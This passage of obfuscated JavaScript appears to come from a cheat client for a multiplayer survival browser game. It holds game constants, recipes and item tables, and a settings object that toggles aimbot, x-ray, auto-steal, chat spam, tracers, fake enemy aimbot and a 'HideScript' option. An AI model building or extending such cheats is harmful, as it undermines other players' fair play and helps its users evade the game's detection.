    THORNBUSH_MOB: COUNTER++,
    CRATE: COUNTER++,
    GIFT: COUNTER++,
    PENGUIN: COUNTER++,
    ALOE_VERA_MOB: COUNTER++,
    FIREFLY: COUNTER++,
    SPELL: COUNTER++,
    FRUIT: COUNTER += 9
  };
  let __p_ODkn_STATE_DELETE = 1;
  let __p_ODkn_STATE_HURT = 2;
  let __p_ODkn_STATE_COLD = 4;
  let __p_ODkn_STATE_HUNGER = 8;
  let __p_ODkn_STATE_ATTACK = 16;
  let __p_ODkn_STATE_WALK = 32;
  let __p_ODkn_STATE_IDLE = 64;
  let __p_ODkn_STATE_HEAL = 128;
  let __p_ODkn_STATE_WEB = 256;
  const WORLD = {
    DAY: 480000,
    WITHOUT_BAG: 10,
    WITH_BAG: 16,
    BAG_SIZE: 6,
    GHOST_DELAY: 60,
    TOP: 1,
    BOTTOM: 2,
    LEFT: 4,
    RIGHT: 8,
    ROTATE: 10,
    DIST_CHEST: 100,
    DIST_FURNACE: 100,
    DIST_WINDMILL: 100,
    DIST_WELL: 100,
    DIST_BREAD_OVEN: 100,
    DIST_SIGN: 100,
    DIST_TOTEM: 100,
    DIST_SIGN: 100,
    DIST_RESURRECTION: 100,
    DIST_EXTRACTOR_MACHINE: 100,
    MODE_PVP: 0,
    MODE_HUNGER_GAMES: 1,
    MODE_ZOMBIES: 2,
    MODE_VAMPIRES: 3,
    MODE_LEGACY: 4,
    MODE_BR: 5,
    MODE_COMMUNITY: 6,
    MODE_EXPERIMENTAL: 7,
    RIVET_GAME_MODES: {
      [0]: "normal",
      [2]: "zombies",
      [3]: "vampires",
      [4]: "forest",
      [7]: "experimental"
    },
    ZOMBIE_SKIN: 0,
    VAMPIRE_SKIN: 0,
    ROBOT_SKIN: 30,
    GHOST: 2,
    GHOST_DELAY: 60000,
    WT1SY: 0,
    LWT1SY: 0,
    WT1EY: 50,
    WT2SY: 0,
    LWT2SY: 40,
    WT2EY: 39,
    LWT2: 830,
    FLOAM_X: 25,
    FLOAM_Y: 8,
    W1SX: 0,
    LW1SX: 0,
    W1EX: 200,
    W2SX: 0,
    LW2SX: 250,
    W2EX: 150,
    W3SX: 0,
    LW3SX: 350,
    W3EX: 100,
    LSANDX: 700,
    SEED: 39879
  };
  let __p_O0mQ_CLIENT_VERSION_NUMBER = 52;
  let __p_O0mQ_CLIENT_TIMEOUT_TIME = 2000;
  let __p_O0mQ_CLIENT_TIMEOUT_NUMBER = 3;
  let __p_O0mQ_CLIENT_PING = "[15]";
  let __p_O0mQ_CLIENT_PING_DELAY = 60000;
  let __p_O0mQ_CLIENT_ROTATE = 0.2;
  let __p_O0mQ_CLIENT_ATTACK = 0.2;
  let __p_O0mQ_CLIENT_SLOW_ATTACK = 0.58;
  let __p_O0mQ_CLIENT_CAM_DELAY = 50;
  let __p_O0mQ_CLIENT_MUTE_DELAY = 125000;
  let __p_O0mQ_CLIENT_TIMEOUT_SERVER = 600000;
  let __p_O0mQ_CLIENT_WAITING_FOR_SERVER = 8000;
  let __p_O0mQ_CLIENT_DELAY_CONNECTION_UPDATE = 5;
  let __p_O0mQ_CLIENT_LAG_DISTANCE = 200;
  let __p_O0mQ_CLIENT_LOOSE_FOCUS = 15;
  let __p_O0mQ_CLIENT_TOKEN_LEN = 14;
  let __p_O0mQ_CLIENT_TEAM_MANAGE = 0;
  let __p_O0mQ_CLIENT_TEAM_SHOW = 1;
  let __p_O0mQ_CLIENT_TEAM_LEAVE = 2;
  let __p_O0mQ_CLIENT_TEAM_JOIN = 3;
  let __p_O0mQ_CLIENT_TEAM_FULL = 4;
  let __p_O0mQ_CLIENT_SKIN_MAX = 20;
  let __p_O0mQ_CLIENT_ACCESSORY_MAX = 14;
  let __p_O0mQ_CLIENT_SYMBOL_MAX = 4;
  let __p_UmX7_CRAFT_CAMPFIRE = 204;
  let __p_UmX7_CRAFT_WOOD_WALL = 264;
  let __p_UmX7_CRAFT_STONE_WALL = 265;
  let __p_UmX7_CRAFT_GOLD_WALL = 266;
  let __p_UmX7_CRAFT_DIAMOND_WALL = 267;
  let __p_UmX7_CRAFT_AMETHYST_WALL = 213;
  let __p_UmX7_CRAFT_REIDITE_WALL = 327;
  let __p_UmX7_CRAFT_WOOD_SPIKE = 262;
  let __p_UmX7_CRAFT_STONE_SPIKE = 270;
  let __p_UmX7_CRAFT_GOLD_SPIKE = 271;
  let __p_UmX7_CRAFT_DIAMOND_SPIKE = 272;
  let __p_UmX7_CRAFT_AMETHYST_SPIKE = 214;
  let __p_UmX7_CRAFT_REIDITE_SPIKE = 329;
  let __p_UmX7_CRAFT_BRIDGE = 216;
  let __p_UmX7_CRAFT_ROOF = 292;
  let __p_UmX7_CRAFT_BERRY_SEED = 206;
  const RECIPES = [{
    r: [[INV.WOOD, 20]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: __p_UmX7_CRAFT_WOOD_WALL,
    id2: INV.WOOD_WALL
  }, {
    r: [[INV.WOOD_WALL, 1], [INV.STONE, 17]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: __p_UmX7_CRAFT_STONE_WALL,
    id2: INV.STONE_WALL
  }, {
    r: [[INV.STONE_WALL, 1], [INV.GOLD, 14]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: __p_UmX7_CRAFT_GOLD_WALL,
    id2: INV.GOLD_WALL
  }, {
    r: [[INV.GOLD_WALL, 1], [INV.DIAMOND, 11]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: __p_UmX7_CRAFT_DIAMOND_WALL,
    id2: INV.DIAMOND_WALL
  }, {
    r: [[INV.DIAMOND_WALL, 1], [INV.AMETHYST, 8]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: __p_UmX7_CRAFT_AMETHYST_WALL,
    id2: INV.AMETHYST_WALL
  }, {
    r: [[INV.AMETHYST_WALL, 1], [INV.REIDITE, 5]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: __p_UmX7_CRAFT_REIDITE_WALL,
    id2: INV.REIDITE_WALL
  }, {
    r: [[INV.WOOD_WALL, 1], [INV.WOOD, 20], [INV.STONE, 15]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: __p_UmX7_CRAFT_WOOD_SPIKE,
    id2: INV.WOOD_SPIKE
  }, {
    r: [[INV.STONE_WALL, 1], [INV.STONE, 70]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: __p_UmX7_CRAFT_STONE_SPIKE,
    id2: INV.STONE_SPIKE
  }, {
    r: [[INV.GOLD_WALL, 1], [INV.STONE, 30], [INV.GOLD, 40]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: __p_UmX7_CRAFT_GOLD_SPIKE,
    id2: INV.GOLD_SPIKE
  }, {
    r: [[INV.DIAMOND_WALL, 1], [INV.STONE, 30], [INV.DIAMOND, 40]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: __p_UmX7_CRAFT_DIAMOND_SPIKE,
    id2: INV.DIAMOND_SPIKE
  }, {
    r: [[INV.AMETHYST_WALL, 1], [INV.STONE, 30], [INV.AMETHYST, 40]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: __p_UmX7_CRAFT_AMETHYST_SPIKE,
    id2: INV.AMETHYST_SPIKE
  }, {
    r: [[INV.REIDITE_WALL, 1], [INV.GOLD, 30], [INV.REIDITE, 40]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: __p_UmX7_CRAFT_REIDITE_SPIKE,
    id2: INV.REIDITE_SPIKE
  }, {
    r: [[INV.WOOD, 30]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: INV.WOOD_DOOR,
    id2: INV.WOOD_DOOR
  }, {
    r: [[INV.WOOD_DOOR, 1], [INV.STONE, 27]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: INV.STONE_DOOR,
    id2: INV.STONE_DOOR
  }, {
    r: [[INV.STONE_DOOR, 1], [INV.GOLD, 24]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: INV.GOLD_DOOR,
    id2: INV.GOLD_DOOR
  }, {
    r: [[INV.GOLD_DOOR, 1], [INV.DIAMOND, 21]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: INV.DIAMOND_DOOR,
    id2: INV.DIAMOND_DOOR
  }, {
    r: [[INV.DIAMOND_DOOR, 1], [INV.AMETHYST, 18]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: INV.AMETHYST_DOOR,
    id2: INV.AMETHYST_DOOR
  }, {
    r: [[INV.AMETHYST_DOOR, 1], [INV.REIDITE, 15]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: INV.REIDITE_DOOR,
    id2: INV.REIDITE_DOOR
  }, {
    r: [[INV.REIDITE_DOOR, 1], [INV.REIDITE, 80], [INV.GOLD, 60]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: INV.REIDITE_DOOR_SPIKE,
    id2: INV.REIDITE_DOOR_SPIKE
  }, {
    r: [[INV.WOOD, 15]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: __p_UmX7_CRAFT_BRIDGE,
    id2: INV.BRIDGE
  }, {
    r: [[INV.WOOD, 30]],
    w: 1,
    f: 0,
    o: 0,
    e: 0,
    id: __p_UmX7_CRAFT_ROOF,
    id2: INV.ROOF
  }, {
    r: [[INV.BERRY, 3]],
    w: 0,
    f: 1,
    o: 0,
    e: 0,
    id: __p_UmX7_CRAFT_BERRY_SEED,
    id2: INV.BERRY_SEED
  }];
  let COUNTER1 = 10000;
  let __p_qVnV_SPRITE_WEAPON_LOADING = ["#FFF", "#FFF"];
  let __p_qVnV_SPRITE_CRATE = 360;
  let __p_qVnV_SPRITE_HURT_DEAD_BOX = 978;
  let __p_qVnV_SPRITE_TREASURE_CHEST = 910;
  let __p_qVnV_SPRITE_HURT_TREASURE_CHEST = 916;
  let __p_qVnV_SPRITE_ICON_LEADER = COUNTER1++;
  let __p_qVnV_SPRITE_ICON_MEMBER = COUNTER1++;
  COUNTER = 0;
  const MY_SPRITE = {
    DAY: 0,
    NIGHT: 1,
    ROOF: COUNTER++,
    ROOFS: COUNTER++,
    BRIDGE: COUNTER++,
    HEART_SYMBOL_HUD: COUNTER++,
    FOOD_SYMBOL_HUD: COUNTER++,
    HUNGER_SYMBOL_HUD: COUNTER++,
    WATER_SYMBOL_HUD: COUNTER++,
    OXYGEN: COUNTER++,
    NEW_GAUGES: COUNTER++
  };
  let sprite;
  let IMAGES;
  const SLOW_DOWN = [];
  for (i = 0; i < 500; i++) {
    SLOW_DOWN[i] = 0;
  }
  {
    SLOW_DOWN[INV.REIDITE_SPEAR] = 1;
    SLOW_DOWN[INV.CRAB_SPEAR] = 1;
    SLOW_DOWN[INV.AMETHYST_SPEAR] = 1;
    SLOW_DOWN[INV.DIAMOND_SPEAR] = 1;
    SLOW_DOWN[INV.GOLD_SPEAR] = 1;
    SLOW_DOWN[INV.STONE_SPEAR] = 1;
    SLOW_DOWN[INV.WOOD_SPEAR] = 1;
    SLOW_DOWN[INV.DRAGON_SPEAR] = 1;
    SLOW_DOWN[INV.LAVA_SPEAR] = 1;
    SLOW_DOWN[INV.COPPER_SPEAR] = 1;
    SLOW_DOWN[INV.IRON_SPEAR] = 1;
    SLOW_DOWN[INV.TOPAZ_SPEAR] = 1;
    SLOW_DOWN[INV.SAPPHIRE_SPEAR] = 1;
    SLOW_DOWN[INV.JADE_SPEAR] = 1;
    SLOW_DOWN[INV.RUBY_SPEAR] = 1;
    SLOW_DOWN[INV.COAL_SPEAR] = 1;
    SLOW_DOWN[INV.AQUAMARINE_SPEAR] = 1;
    SLOW_DOWN[INV.EMERALD_SPEAR] = 1;
    SLOW_DOWN[INV.WOOD_SWORD] = 1;
    SLOW_DOWN[INV.STONE_SWORD] = 1;
    SLOW_DOWN[INV.COPPER_SWORD] = 1;
    SLOW_DOWN[INV.IRON_SWORD] = 1;
    SLOW_DOWN[INV.GOLD_SWORD] = 1;
    SLOW_DOWN[INV.TOPAZ_SWORD] = 1;
    SLOW_DOWN[INV.DIAMOND_SWORD] = 1;
    SLOW_DOWN[INV.AMETHYST_SWORD] = 1;
    SLOW_DOWN[INV.REIDITE_SWORD] = 1;
    SLOW_DOWN[INV.PIRATE_SWORD] = 1;
    SLOW_DOWN[INV.SAPPHIRE_SWORD] = 1;
    SLOW_DOWN[INV.JADE_SWORD] = 1;
    SLOW_DOWN[INV.RUBY_SWORD] = 1;
    SLOW_DOWN[INV.COAL_SWORD] = 1;
    SLOW_DOWN[INV.AQUAMARINE_SWORD] = 1;
    SLOW_DOWN[INV.EMERALD_SWORD] = 1;
    SLOW_DOWN[INV.DRAGON_SWORD] = 1;
    SLOW_DOWN[INV.LAVA_SWORD] = 1;
    SLOW_DOWN[INV.EMERALD_AXE] = 1;
    SLOW_DOWN[INV.AQUAMARINE_AXE] = 1;
    SLOW_DOWN[INV.COAL_AXE] = 1;
    SLOW_DOWN[INV.RUBY_AXE] = 1;
    SLOW_DOWN[INV.JADE_AXE] = 1;
    SLOW_DOWN[INV.SAPPHIRE_AXE] = 1;
    SLOW_DOWN[INV.REIDITE_AXE] = 1;
    SLOW_DOWN[INV.AMETHYST_AXE] = 1;
    SLOW_DOWN[INV.DIAMOND_AXE] = 1;
    SLOW_DOWN[INV.TOPAZ_AXE] = 1;
    SLOW_DOWN[INV.GOLD_AXE] = 1;
    SLOW_DOWN[INV.IRON_AXE] = 1;
    SLOW_DOWN[INV.COPPER_AXE] = 1;
    SLOW_DOWN[INV.STONE_AXE] = 1;
    SLOW_DOWN[INV.WOOD_AXE] = 1;
  }
  const PLAYER_LEVEL = [];
  const weapons = [INV.LAVA_SWORD, INV.LAVA_SPEAR, INV.DRAGON_SWORD, INV.DRAGON_SPEAR, INV.EMERALD_AXE, INV.EMERALD_SWORD, INV.EMERALD_SPEAR, INV.AQUAMARINE_AXE, INV.AQUAMARINE_SWORD, INV.AQUAMARINE_SPEAR, INV.COAL_AXE, INV.COAL_SWORD, INV.COAL_SPEAR, INV.RUBY_AXE, INV.RUBY_SWORD, INV.RUBY_SPEAR, INV.JADE_AXE, INV.JADE_SWORD, INV.JADE_SPEAR, INV.SAPPHIRE_AXE, INV.SAPPHIRE_SWORD, INV.SAPPHIRE_SPEAR, INV.REIDITE_AXE, INV.REIDITE_SWORD, INV.REIDITE_SPEAR, INV.CRAB_SPEAR, INV.PIRATE_SWORD, INV.AMETHYST_AXE, INV.AMETHYST_SWORD, INV.AMETHYST_SPEAR, INV.DIAMOND_AXE, INV.DIAMOND_SWORD, INV.DIAMOND_SPEAR, INV.TOPAZ_AXE, INV.TOPAZ_SWORD, INV.TOPAZ_SPEAR, INV.GOLD_AXE, INV.GOLD_SWORD, INV.GOLD_SPEAR, INV.IRON_AXE, INV.IRON_SWORD, INV.IRON_SPEAR, INV.COPPER_AXE, INV.COPPER_SWORD, INV.COPPER_SPEAR, INV.STONE_AXE, INV.STONE_SWORD, INV.STONE_SPEAR, INV.WOOD_AXE, INV.WOOD_SWORD, INV.WOOD_SPEAR];
  const helmets = [INV.LAVA_HELMET, INV.DRAGON_HELMET, INV.EMERALD_HELMET, INV.AQUAMARINE_HELMET, INV.COAL_HELMET, INV.RUBY_HELMET, INV.JADE_HELMET, INV.SAPPHIRE_HELMET, INV.REIDITE_HELMET, INV.REIDITE_FIRE_PROTECTION_, INV.CRAB_CROWN, INV.AMETHYST_FIRE_PROTECTION_, INV.AMETHYST_HELMET, INV.DIAMOND_FIRE_PROTECTION_, INV.DIAMOND_HELMET, INV.TOPAZ_HELMET, INV.CROWN_OF_LUCK, INV.CROWN_OF_LIFE, INV.CROWN_OF_THE_ANGEL, INV.GOLD_HELMET, INV.IRON_HELMET, INV.COPPER_HELMET, INV.STONE_HELMET, INV.WOOD_HELMET];
  const IS_HELMET = [];
  for (const id of helmets) {
    IS_HELMET[id] = 1;
  }
  const IS_WEAPON = [];
  for (const id of weapons) {
    IS_WEAPON[id] = 1;
  }
  const non_damaged_food = [INV.BERRY, INV.COOKED_MEAT, INV.BREAD, INV.COOKIE, INV.CAKE, INV.FOODFISH_COOKED, INV.SANDWICH, INV.PUMPKIN, INV.GARLIC, INV.CANDY, INV.SUGAR_CANE, INV.CRAB_STICK, INV.TOMATO, INV.CARROT, INV.WATERMELON];
  const foodRecoveryValues = {
    [INV.BERRY]: 0.1,
    [INV.MEAT]: 0.15,
    [INV.COOKED_MEAT]: 0.35,
    [INV.BREAD]: 0.15,
    [INV.COOKIE]: 0.5,
    [INV.CAKE]: 1,
    [INV.FISH]: 0.18,
    [INV.FOODFISH_COOKED]: 0.35,
    [INV.SANDWICH]: 1,
    [INV.PUMPKIN]: 0.3,
    [INV.GARLIC]: 0.14,
    [INV.CANDY]: 0.2,
    [INV.SUGAR_CANE]: 1,
    [INV.CRAB_STICK]: 0.2,
    [INV.TOMATO]: 0.16,
    [INV.CARROT]: 0.2,
    [INV.WATERMELON]: 0.15
  };
  const IS_FOOD = [];
  const IS_NON_DAMAGED_FOOD = [];
  for (const id of non_damaged_food) {
    IS_NON_DAMAGED_FOOD[id] = 1;
  }
  for (const id of non_damaged_food) {
    IS_FOOD[id] = 1;
  }
  IS_FOOD[INV.MEAT] = 1;
  IS_FOOD[INV.FISH] = 1;
  const IS_SEED = {
    [INV.BERRY_SEED]: true,
    [INV.WHEAT_SEED]: true,
    [INV.PUMPKIN_SEED]: true,
    [INV.CARROT_SEED]: true,
    [INV.TOMATO_SEED]: true,
    [INV.THORBUSHES_SEED]: true,
    [INV.BANANA_SEED]: true,
    [INV.GARLIC_SEED]: true,
    [INV.ALOE_VERA_SEED]: true,
    [INV.WATERMELON_SEED]: true
  };
  const IS_BUILD_FOR_AUTOBUILD = {
    [INV.BRIDGE]: true,
    [INV.ROOF]: true,
    [INV.PLOT]: true
  };
  const SPIKE_DAMAGES = {
    [WORLD.MODE_PVP]: {
      [ITEMS.SPIKE]: 10,
      [ITEMS.STONE_SPIKE]: 18,
      [ITEMS.GOLD_SPIKE]: 26,
      [ITEMS.DIAMOND_SPIKE]: 33,
      [ITEMS.AMETHYST_SPIKE]: 40,
      [ITEMS.REIDITE_SPIKE]: 50
    },
    [WORLD.MODE_LEGACY]: {
      [ITEMS.SPIKE]: 10,
      [ITEMS.STONE_SPIKE]: 20,
      [ITEMS.GOLD_SPIKE]: 30,
      [ITEMS.DIAMOND_SPIKE]: 40,
      [ITEMS.AMETHYST_SPIKE]: 50,
      [ITEMS.REIDITE_SPIKE]: 60
    },
    default: {
      [ITEMS.SPIKE]: 10,
      [ITEMS.STONE_SPIKE]: 20,
      [ITEMS.GOLD_SPIKE]: 30,
      [ITEMS.DIAMOND_SPIKE]: 40,
      [ITEMS.AMETHYST_SPIKE]: 50,
      [ITEMS.REIDITE_SPIKE]: 60
    }
  };
  const IS_HAMMER = {
    [INV.STONE_HAMMER]: true,
    [INV.GOLD_HAMMER]: true,
    [INV.DIAMOND_HAMMER]: true,
    [INV.AMETHYST_HAMMER]: true,
    [INV.REIDITE_HAMMER]: true,
    [INV.EMERALD_HAMMER]: true,
    [INV.SUPER_HAMMER]: true
  };
  const IS_PICKAXE = {
    [INV.WOOD_PICK]: true,
    [INV.STONE_PICK]: true,
    [INV.COPPER_PICK]: true,
    [INV.IRON_PICK]: true,
    [INV.GOLD_PICK]: true,
    [INV.TOPAZ_PICK]: true,
    [INV.DIAMOND_PICK]: true,
    [INV.AMETHYST_PICK]: true,
    [INV.REIDITE_PICK]: true,
    [INV.EMERALD_PICK]: true
  };
  const RESOURCE_MARKET = {
    Wood: {
      rate: 1 / 3,
      packetSize: 83,
      packetId: 0
    },
    Stone: {
      rate: 1 / 4,
      packetSize: 62,
      packetId: 1
    },
    Gold: {
      rate: 1 / 6,
      packetSize: 41,
      packetId: 2
    },
    Diamond: {
      rate: 4,
      packetSize: 252,
      packetId: 3
    },
    Amethyst: {
      rate: 8,
      packetSize: 248,
      packetId: 4
    },
    Reidite: {
      rate: 16,
      packetSize: 240,
      packetId: 5
    }
  };
  let mySprite = [];
  {
    mySprite[MY_SPRITE.ROOF] = [];
    mySprite[MY_SPRITE.ROOF][MY_SPRITE.DAY] = CTI(create_roof(0.59, true, ["#0d1b1c", "#44301b", "#57442a", "#523e26"]));
    mySprite[MY_SPRITE.ROOF][MY_SPRITE.NIGHT] = CTI(create_roof(0.59, true, ["#0c0c0d", "#062124", "#10373d", "#0f3333"]));
    mySprite[MY_SPRITE.ROOFS] = [mySprite[MY_SPRITE.ROOF]];
    mySprite[MY_SPRITE.ROOFS][1] = [];
    mySprite[MY_SPRITE.ROOFS][2] = [];
    mySprite[MY_SPRITE.ROOFS][1][MY_SPRITE.DAY] = CTI(create_roof1(0.59, true, ["#0d1b1c", "#44301b", "#57442a", "#523e26"]));
    mySprite[MY_SPRITE.ROOFS][1][MY_SPRITE.NIGHT] = CTI(create_roof1(0.59, true, ["#0c0c0d", "#062124", "#10373d", "#0f3333"]));
    mySprite[MY_SPRITE.ROOFS][2][MY_SPRITE.DAY] = CTI(create_roof2(0.59, true, ["#0d1b1c", "#44301b", "#57442a", "#523e26"]));
    mySprite[MY_SPRITE.ROOFS][2][MY_SPRITE.NIGHT] = CTI(create_roof2(0.59, true, ["#0c0c0d", "#062124", "#10373d", "#0f3333"]));
    mySprite[MY_SPRITE.BRIDGE] = [];
    mySprite[MY_SPRITE.BRIDGE][MY_SPRITE.DAY] = CTI(create_bridge(1, true, ["#1e2021", "#332715", "#4C3B19", "#574122"]));
    mySprite[MY_SPRITE.BRIDGE][MY_SPRITE.NIGHT] = CTI(create_bridge(1, true, ["#0c0c0d", "#071f22", "#0d2e33", "#184747"]));
    mySprite[MY_SPRITE.HEART_SYMBOL_HUD] = create_symbol_hud(0.35, ["#072428", "#67A242", "#67A242"], 0);
    mySprite[MY_SPRITE.COLD_SYMBOL_HUD] = create_symbol_hud(0.35, ["#172130", "#649BB2", "#FFFFFF", "#FFFFFF", "#90C2D3", "#649BB2", "#84BDD1", "#2F5866"], 1);
    mySprite[MY_SPRITE.FOOD_SYMBOL_HUD] = create_symbol_hud(0.35, ["#3F0B11", "#B13424", "#FFFFFF", "#B13424", "#7e180b"], 2);
    mySprite[MY_SPRITE.WATER_SYMBOL_HUD] = create_symbol_hud(0.35, ["#1B2F4C", "#29488E", "#76c3e8", "#ffffff"], 3);
    mySprite[MY_SPRITE.NEW_GAUGES] = CTI(create_gauges1(1));
    mySprite[MY_SPRITE.OXYGEN] = CTI(create_oxygen_gauges(1));
  }
  let Settings = {
    Aimbot: {
      e: false,
      k: "KeyF",
      angle: null,
      autoHit: true,
      isSmooth: true,
      isAimbotGoldenChicken: true,
      isAimbotRabbit: true
    },
    AutoBook: {
      e: true,
      pullOldRight: true
    },
    AutoSpike: {
      e: false,
      k: "Space",
      AngleSpread: true,
      angleSpreadMode: "Normal",
      angleSpreadModeOptions: ["Normal", "360"],
      IsFollowMouse: true,
      p: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall"],
      isSpikeInWater: false
    },
    AutoWall: {
      e: false,
      k: "KeyC",
      AngleSpread: true,
      IsFollowMouse: true
    },
    AutoPvP: {
      e: false,
      k: "NONE",
      isPullWeapon: true,
      isPullHelmet: true,
      isAutoSpike: true,
      is360: false
    },
    AutoCraft: {
      e: false,
      k: "KeyK"
    },
    AutoCraftSpikes: {
      e: false,
      k: "NONE",
      p: "Highest Craftale"
    },
    AutoRecycle: {
      e: false,
      k: "KeyL"
    },
    AutoDiving: {
      e: true
    },
    AutoPilot: {
      e: true
    },
    AutoPirateHat: {
      e: true
    },
    AutoPutChest: {
      e: false,
      k: "NONE",
      invIds: []
    },
    AutoTakeChest: {
      e: false,
      k: "NONE",
      invIds: []
    },
    AutoFire: {
      e: false,
      k: "NONE"
    },
    AutoTotem: {
      e: false,
      k: "KeyH"
    },
    VisualHp: {
      e: true,
      animal: true,
      box: true,
      player: true
    },
    BoxInfo: {
      e: true
    },
    ColoredSpike: {
      e: true
    },
    DropWeapon: {
      k: "KeyV"
    },
    FakeDrop: {
      e: false,
      k: "NONE"
    },
    ShowGauges: {
      e: true
    },
    ShowFPS: {
      e: true
    },
    ShowPing: {
      e: true
    },
    ShowHoodName: {
      e: true
    },
    ShowJoinLeave: {
      e: true
    },
    ShowCraftTime: {
      e: true
    },
    ShowSpikeWarningCircle: {
      e: true
    },
    Tracers: {
      e: true,
      target: {
        teamate: true,
        enemy: true,
        spider: false,
        wolf: false,
        rabbit: false,
        hawk: false,
        kraken: false,
        sandworm: false,
        lavadragon: false,
        goldenchicken: false
      }
    },
    SpamChat: {
      e: false,
      message: "LMB"
    },
    AutoFood: {
      e: true
    },
    AutoDrink: {
      e: true,
      range: 0.5,
      autoEatWatermelon: false
    },
    ListEnabledHacks: {
      e: true,
      anchor: "BottomLeft"
    },
    Xray: {
      e: false,
      k: "Backquote",
      opacity: 0.5
    },
    Equiq: false,
    Roof: {
      e: true,
      opacity: 0.5
    },
    AutoFarm: {
      e: false,
      k: "KeyU",
      angle: null,
      water: true,
      x: null,
      xx: null,
      y: null,
      yy: null,
      sx: null,
      sy: null,
      dropBeri: false,
      distance: 500,
      cmd: "drop beri"
    },
    Debug: {
      e: false,
      showType: false,
      showPID: true,
      showID: true,
      showInfo: true,
      showCoordinates: false,
      showDistance: true,
      showSpeed: false,
      debugRoof: false,
      debugBridge: false,
      debugPlot: false,
      fontSize: 16
    },
    AutoCrown: {
      e: true,
      health_to_activate: 100
    },
    AutoIce: {
      e: true,
      eatForHeal: true,
      iceHealTriggerAmount: 200
    },
    ChestInfo: {
      e: true,
      isShowInvId: false
    },
    ExitVehicle: {
      e: false,
      k: "KeyX"
    },
    Token: {
      token: "",
      token_id: ""
    },
    ExtractorTake: {
      e: false,
      k: "NONE"
    },
    ExtractorPut: {
      e: false,
      k: "NONE"
    },
    AutoBreadPut: {
      e: false,
      k: "NONE"
    },
    AutoBreadTake: {
      e: false,
      k: "NONE"
    },
    WorldInfo: {
      e: true
    },
    Spectator: {
      e: false,
      k: "KeyP"
    },
    AutoSteal: {
      e: false,
      k: "KeyQ"
    },
    AutoTame: {
      e: false,
      angle: null
    },
    Market: {
      resourceType: "Wood",
      amount: 1000,
      forestCast: {
        wood: 0,
        stone: 0,
        gold: 0,
        diamond: 0,
        amethyst: 0,
        reidite: 0
      }
    },
    RenderOnTop: {
      e: true,
      box: true,
      player: true,
      treasure_chest: true
    },
    Translator: {
      e: false,
      IncomingMessage: false,
      MyLanguage: "English",
      OutgoingMessage: false,
      TranslateTo: "English"
    },
    Gui: {
      theme: "Default",
      scale: 1,
      fontSize: 14,
      k: "NONE"
    },
    DrawHpInMyPlayer: {
      e: true,
      Threshold: [40, 100]
    },
    GhostInfo: {
      e: true
    },
    BigZoom: {
      e: true
    },
    BulkItems: {
      e: false,
      k: "CapsLock",
      amount: 100
    },
    SpikeCrafter: {
      e: false,
      k: "NONE",
      target: "Reidite Spike",
      targetOptions: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Nothing"]
    },
    AutoBottleZMA: {
      e: false,
      k: "NONE",
      hpForItemActivation: 60
    },
    AutoHamCmty: {
      e: false,
      k: "NONE",
      angle: null
    },
    AutoGreenCrownCmty: {
      e: false,
      k: "NONE"
    },
    AimbotSpike: {
      e: false,
      k: "NONE",
      distance: 110,
      mode: "SWITCH"
    },
    AutoBuild: {
      e: false,
      k: "KeyT"
    },
    AutoKsDeadBox: {
      e: false,
      k: "NONE",
      angle: null
    },
    DrawTimerInPlayer: {
      e: true,
      isInMyPlayer: true,
      isInOthers: true
    },
    DrawWeaponSwitchDelay: {
      e: true
    },
    lmbServerUrl: "",
    teamId: "",
    ShowRangeOfWeapon: {
      e: true
    },
    TakeChest: {
      e: false,
      k: "NONE",
      targetChests: []
    },
    PutChest: {
      e: false,
      k: "NONE",
      targetChests: []
    },
    VehicleOpacity: 0.5,
    HoodTimer: {
      e: true,
      color: "#3d2a53"
    },
    AntiHood: {
      e: true,
      angle: null
    },
    ShowLastDead: {
      e: true,
      Pos: null,
      time: null
    },
    ShowTotemInMap: {
      e: true,
      Pos: null
    },
    HideScript: {
      e: false,
      k: "KeyJ"
    },
    ShowMovement: {
      e: true,
      player: true,
      animal: true
    },
    AnimalCounter: {
      e: true
    },
    GaugesUI: "new",
    SmartCraft: {
      e: false,
      k: "NONE"
    },
    FakeDropWeapon: {
      e: true
    },
    AutoBuyWood: {
      e: false,
      k: "NONE",
      berryTrigger: 1000
    },
    AutoBuyAllStone: {
      e: false,
      k: "NONE"
    },
    AutoBuyAllGold: {
      e: false,
      k: "NONE"
    },
    ShowInBed: {
      e: true
    },
    OffsetCam: {
      x: 0,
      y: 0
    },
    LockAngle: {
      e: false,
      angle: 0,
      k: "NONE"
    },
    SpamBuild: {
      e: false,
      k: "NONE"
    },
    ShowBuildLimit: {
      e: true
    },
    MuteEnemyChat: {
      e: true,
      k: "NONE"
    },
    SyncToPlayer: {
      e: false,
      k: "NONE",
      targetId: 0
    },
    FakeEnemyAimbot: {
      e: false
    },
    AutoEme: {
      e: false,
      k: "NONE"
    }
  };
  let __p_ePLv_TimerTools_HPTimer = Date.now();
  let __p_ePLv_TimerTools_GaugeTimer = Date.now();
  let times = [];
  let lastFPSUpdate = performance.now();
  let FPSCounter = 0;
  let start_ping_time;
  let PingCounter = -1;
  let LastCrafted = null;
  let LastRecycled = null;
  let leapoffLastSent = performance.now();
  let eatIceLastSent = performance.now();
  let ThisTabMiniMized = false;
  let MinimizedTimer = performance.now();
  let isWaitingToUseClothe = false;
  let oldClothe = null;
